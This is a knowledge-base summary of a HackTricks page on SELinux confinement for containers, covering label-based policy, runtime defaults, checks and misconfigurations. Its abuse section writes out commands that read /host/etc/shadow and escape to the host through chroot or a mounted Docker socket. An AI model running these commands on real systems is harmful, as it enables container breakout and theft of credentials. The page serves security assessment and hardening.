---
title: "HackTricks: Container SELinux"
tags: [container-security, selinux, mandatory-access-control, linux-hardening]
sources: [hacktricks-container-selinux.md]
updated: 2026-05-01
---

# HackTricks: Container SELinux

Source: [hacktricks-container-selinux.md](../../raw/hacktricks-container-selinux.md)

## Key Takeaways

SELinux is a **label-based Mandatory Access Control** system. Every process and object carries a security context; policy decides which domains may interact with which types. Container runtimes launch container processes under a confined domain and label container content with matching types. The process may touch what its label permits — host content becomes visible through a mount but remains inaccessible if the labels don't allow it.

## SELinux vs AppArmor

| Dimension              | AppArmor                                                  | SELinux                                                        |
| ---------------------- | --------------------------------------------------------- | -------------------------------------------------------------- |
| Policy basis           | **Path-based**                                            | **Label-based**                                                |
| Mount-trick robustness | Weaker — same content at unexpected path may evade policy | Stronger — asks what the object's label is, not where it lives |
| Ecosystem              | Ubuntu, Debian, SUSE                                      | Fedora, RHEL, CentOS Stream, OpenShift                         |

Label-based policy is the reason a container on an SELinux host can have a sensitive host path bind-mounted yet still be unable to read it — the label boundary survives the mount.

## Runtime Defaults

| Runtime           | Default           | Notes                                                                                               |
| ----------------- | ----------------- | --------------------------------------------------------------------------------------------------- |
| Docker Engine     | Host-dependent    | Available on SELinux hosts; exact behavior depends on daemon config                                 |
| Podman            | Commonly enabled  | Normal part of Podman on SELinux systems; rootless Podman + SELinux = strongest mainstream baseline |
| Kubernetes        | Not automatic     | Pods need explicit `securityContext.seLinuxOptions`; node must support enforcement                  |
| CRI-O / OpenShift | Heavily relied on | SELinux is central to the node isolation model                                                      |

## Checks

```bash
getenforce                          # Enforcing / Permissive / Disabled
sestatus
ps -eZ | head                       # Process labels
ls -Zd /var/lib/containers          # Container storage labels
cat /proc/self/attr/current         # Current process security context

# Compare confined vs unconfined run
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```

Key signals:

- `Enforcing` → policy is active
- `Permissive` → policy logs but does not block — effectively disabled from a security standpoint
- Process context looks too broad or generic → workload may not be running under the expected container domain

## Misconfigurations

- **`--security-opt label=disable`** — most common; applied to fix a volume mount denial rather than fixing labels
- **Broad relabeling of host content** — makes mounts work but expands what the container can touch
- **Permissive mode on the node** — SELinux appears installed but provides no enforcement
- **Installed ≠ effective** — always verify `getenforce`, not just that SELinux packages are present

## Abuse Scenarios

### Probe when labeling is absent or permissive

```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```

### Information disclosure via unconfined host bind mount

```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
```

### Full example: label=disable + writable host mount → host escape

```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
# confirm escape
id && hostname && cat /etc/passwd | tail
```

### Full example: label=disable + runtime socket → delegate escape

```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```

SELinux often explains why a generic breakout works on one host but fails on another with identical runtime flags — the label boundary is the missing ingredient.

## Related

- [mandatory-access-control](../concepts/mandatory-access-control.md)
- [container-security](../concepts/container-security.md)
- [HackTricks: Container AppArmor](hacktricks-container-apparmor.md)
- [apparmor-profiles](../concepts/apparmor-profiles.md)
